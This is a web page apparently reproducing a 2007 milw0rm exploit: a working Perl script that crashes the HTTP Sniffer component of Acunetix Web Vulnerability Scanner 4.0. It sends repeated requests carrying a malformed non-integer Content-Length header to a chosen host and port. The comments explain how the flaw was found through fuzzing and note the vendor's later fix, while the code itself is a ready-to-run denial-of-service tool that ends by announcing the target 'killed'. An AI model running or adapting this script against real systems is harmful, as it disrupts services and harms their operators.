<html><head><title>Acunetix WVS <= 4.0 20060717 HTTP Sniffer Component Remote DoS</title></head><pre>#!/usr/bin/perl -w
#
# Acunetix Web Vulnerability Scanner 4.0 &lt;= Build 20060717
# HTTP Sniffer component
# Remote Denial of Service
#
# Explaination:
# I found a DoS in Acunetix WVS doing a little bit of fuzzing.
# The flaw is triggered when a malformed packet is sent. Thus, an Exception Handler shows
# an Error Window saying: &quot;'die!!!' is not a valid integer value&quot;, but, if we sent the
# same packet again (while that message still visible) the application will crash.
#
# The malformed HTTP packet contains an invalid 'Content-Length' field (string), and it
# must be a positive integer.
#
# Acunetix' support: &quot;The bug which was causing it to crash was also related to another
# bug fix which was implemented in later versions.&quot;. So, in latest version, an Error
# message like this appears:
#  ________________________________________________________
# |wvs.exe                                                 |
# |--------------------------------------------------------|
# |[X] An error ocurred in the application                 |
# |                                  |continue application||
# |                                  |restart application ||
# ||send bug report||show bug report||close applicacion   ||
# |________________________________________________________|
#
# Affected version tested:
# Acunetix WVS (Consultant Edition) 4.0 Build 20060717
#
# Non-affected version tested:
# Acunetix WVS 4.0 Build 20060717
#
# nitr0us &lt;nitrousenador[ at ]gmail[ dot]com&gt;
# 01/01/07 . . . Happy new year.

use strict;
use Socket qw( :DEFAULT :crlf );        # $CRLF
use IO::Socket;

sub header
{
       print &quot;################################################################\n&quot;;
       print &quot;#   Acunetix Web Vulnerability Scanner 4.0 &lt;= Build 20060717   #\n&quot;;
       print &quot;#                  HTTP Sniffer component                      #\n&quot;;
       print &quot;#                 Remote Denial of Service                     #\n&quot;;
       print &quot;#                        by nitr0us                            #\n&quot;;
       print &quot;################################################################\n\n&quot;;
       print &quot;Usage: $0 &lt;host&gt; [port(default 8080)]\n&quot;;
       exit(0xdead);
}

header() unless $ARGV[0];

my $port = 8080;
my $acunetix_wvs;
my $packetz = 5;

if($ARGV[1]){
       $port = $ARGV[1];
}

print &quot;\n[+] Connecting and sending $packetz malformed packetz\n\n&quot;;

for(my $foo = 0; $foo &lt; $packetz; $foo++){
       $acunetix_wvs = IO::Socket::INET-&gt;new(  PeerAddr        =&gt;      $ARGV[0],
                                               PeerPort        =&gt;      $port,
                                               Proto           =&gt;      'tcp')
               or die &quot;Could not create socket: $!\n&quot;;

       print $acunetix_wvs &quot;GET / HTTP/1.0$CRLF&quot;;
       print $acunetix_wvs &quot;Content-Length: die!!!$CRLF$CRLF&quot;; # Trigger

       $acunetix_wvs-&gt;close();

       sleep(1);
}

print &quot;[+] $packetz malformed packetz sent ];D\n\n&quot;;
print &quot;[+] Acunetix WVS! killed ! ;)\n\n&quot;;

# milw0rm.com [2007-01-04]</pre></html>